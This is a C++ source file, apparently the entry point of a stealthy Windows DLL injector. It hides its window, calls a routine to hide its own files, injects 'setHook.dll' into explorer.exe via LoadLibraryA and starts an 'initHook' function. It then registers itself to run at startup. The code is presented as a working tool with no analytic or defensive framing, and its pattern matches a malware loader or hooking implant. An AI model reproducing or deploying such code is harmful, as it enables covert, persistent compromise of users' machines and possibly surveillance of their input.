#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#include "Injector.h"

int		main()
{
	Injector	inject;
	std::string pathDll;
	HANDLE		process;

	if (!(inject.getTargetProcess(L"explorer.exe")))
		return (-1);
	if (!(inject.createPath("setHook.dll")))
		return (-1);
	
	pathDll = inject.getPathDll();
	process = inject.getProcess();

	if (!(inject.hideSources()))
		return (-1);
	if (!(inject.injectDll(process, "kernel32.dll", "LoadLibraryA", (LPVOID)pathDll.c_str(), pathDll.length() + 1)))
		return (-1);
	Sleep(5000);
	if (!(inject.injectDll(process, pathDll.c_str(), "initHook", NULL, 0)))
		return (-1);
	if (!inject.checkStartingProcess(L"injector"))
		inject.addToStartingProcess(L"injector");
	else
		return (-1);
	return (0);
}

